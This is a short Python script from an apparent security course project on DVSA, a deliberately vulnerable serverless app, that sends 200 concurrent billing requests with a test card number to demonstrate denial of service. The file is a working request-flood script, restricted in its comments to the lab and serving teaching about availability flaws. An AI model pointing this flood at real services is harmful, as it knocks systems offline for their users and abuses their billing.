import os
import threading
import requests

"""
ICS344 DVSA Security Project
Lesson 6 - Denial of Service (DoS)

This helper script sends concurrent billing requests to demonstrate how the
DVSA billing endpoint behaves under high request volume.

IMPORTANT:
- Use only in the authorized DVSA lab environment.
- Do not commit real authorization tokens to GitHub.
- Set DVSA_API_URL, DVSA_TOKEN, and DVSA_ORDER_ID before running.
"""

API_URL = os.getenv("DVSA_API_URL", "https://<api-id>.execute-api.us-east-1.amazonaws.com/dvsa/order")
AUTH_TOKEN = os.getenv("DVSA_TOKEN", "<TOKEN>")
ORDER_ID = os.getenv("DVSA_ORDER_ID", "<ORDER_ID>")
THREAD_COUNT = int(os.getenv("DVSA_THREAD_COUNT", "200"))

headers = {
    "Authorization": AUTH_TOKEN,
    "Content-Type": "application/json"
}

payload = {
    "action": "billing",
    "order-id": ORDER_ID,
    "data": {
        "ccn": "4242424242424242",
        "exp": "03/28",
        "cvv": "123"
    }
}


def send_request(i):
    try:
        response = requests.post(API_URL, json=payload, headers=headers, timeout=20)
        print(f"Request {i}: {response.status_code} - {response.text[:80]}")
    except Exception as error:
        print(f"Request {i}: ERROR - {error}")


if __name__ == "__main__":
    print("=" * 70)
    print("Lesson 6 - DoS Concurrent Billing Request Test")
    print("=" * 70)
    print(f"Target API: {API_URL}")
    print(f"Thread count: {THREAD_COUNT}")
    print("-" * 70)

    threads = []

    for i in range(THREAD_COUNT):
        thread = threading.Thread(target=send_request, args=(i,))
        threads.append(thread)
        thread.start()

    for thread in threads:
        thread.join()

    print("=" * 70)
    print("Test completed.")
    print("=" * 70)
